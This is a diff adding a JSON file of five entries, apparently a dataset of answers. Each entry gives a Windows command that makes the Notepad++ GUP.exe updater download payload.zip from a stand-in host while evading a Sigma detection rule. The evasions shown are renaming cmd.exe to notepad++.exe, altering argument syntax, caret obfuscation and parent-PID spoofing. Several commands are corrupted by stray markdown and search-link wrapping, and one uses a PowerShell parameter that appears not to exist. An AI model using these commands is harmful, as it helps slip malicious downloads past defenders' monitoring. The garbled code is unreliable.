@@ -1,0 +1,22 @@
+[
+  {
+    "output": "cmd.exe /c copy C:\\Windows\\System32\\cmd.exe C:\\Temp\\notepad++.exe && C:\\Temp\\notepad++.exe /c \"C:\\Program Files\\Notepad++\\updater\\GUP.exe -unzipTo C:\\Temp [http://example.com/payload.zip](https://www.google.com/search?q=http://example.com/payload.zip)\"",
+    "explanation": "The rule uses a negation filter that explicitly checks if the ParentImage ends with '\\notepad++.exe'. By copying a legitimate shell like cmd.exe to a temporary directory, naming it notepad++.exe, and using it to spawn the GUP utility, the filter condition evaluates to true, causing the SIEM to discard the alert."
+  },
+  {
+    "output": "\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\" -unzipTo=C:\\Temp [http://example.com/payload.zip](https://www.google.com/search?q=http://example.com/payload.zip)",
+    "explanation": "The 'selection_cli' condition relies on a strict text string match for ' -unzipTo ' with trailing and leading spaces. Substituting the trailing space with an equals sign ('-unzipTo=') to supply the destination argument breaks the static signature matching logic while allowing the parameter to parse successfully."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Program Files\\Notepad++\\updater\\GUP.exe -unzipTo C:\\Temp h^t^t^p://[example.com/payload.zip]()\"",
+    "explanation": "The Windows command shell interprets the caret symbol (^) as an escape character. When executed inside cmd.exe, the raw process creation logs will capture the literal string 'h^t^t^p', breaking the contiguous 'http' substring match constraint without affecting the network resolution capabilities of the binary."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\cmd.exe C:\\Temp\\notepad++.exe && C:\\Temp\\notepad++.exe /c C:\\Users\\Public\\GUP.exe -unzipTo C:\\Temp http://example.com/payload.zip",
+    "explanation": "Bypass via Parent Process Name Spoofing: The Sigma rule contains a filter that excludes alerts if the parent process image ends with '\\notepad++.exe'. Because it does not verify the path or signature of the parent process, an attacker can simply rename their command shell, script interpreter, or malware to 'notepad++.exe'. When this renamed file launches GUP.exe, the filter condition is met, and the alert is successfully evaded."
+  },
+  {
+    "output": "Start-Process -FilePath \"C:\\Users\\Public\\GUP.exe\" -ArgumentList \"-unzipTo C:\\Temp http://example.com/payload.zip\" -ParentProcessId (Get-Process notepad++ | Select-Object -First 1).Id",
+    "explanation": "Bypass via Parent PID (PPID) Spoofing: An attacker can leverage Windows APIs to spawn GUP.exe while explicitly assigning a legitimate, already-running instance of Notepad++ as its parent process. The resulting telemetry will show the legitimate Notepad++ as the parent, matching the rule's exclusion filter and bypassing detection."
+  }
+]
